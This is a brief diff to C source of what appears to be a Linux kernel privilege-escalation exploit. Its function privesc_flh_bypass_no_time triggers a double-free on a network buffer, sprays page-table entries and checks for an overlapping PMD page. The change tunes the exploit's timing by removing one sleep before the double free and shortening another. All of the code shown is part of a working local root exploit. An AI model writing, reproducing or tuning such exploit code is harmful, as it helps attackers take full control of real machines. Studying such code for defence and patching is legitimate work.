@@ -332,8 +332,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		*(unsigned long long*)PTI_TO_VIRT(2, 0, i, 0, 0) = i;
 
 	PRINTF_VERBOSE("[*] double-freeing skb...\n");
-	printf("[*] SLEEP 2s before double free...\n");
-	sleep(3);
+
 	// cause double-free on skb from earlier
 	df_ip_header.ip_id = 0x1337;
 	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
@@ -346,7 +345,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 	// allocate overlapping PMD page (overlaps with PTE)
 	printf("[*] SLEEP 2s after double free...\n");
-	sleep(3);
+	sleep(2);
 	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
 
 	printf("[*] checking %d sprayed pte's for overlap...\n", CONFIG_PTE_SPRAY_AMOUNT);
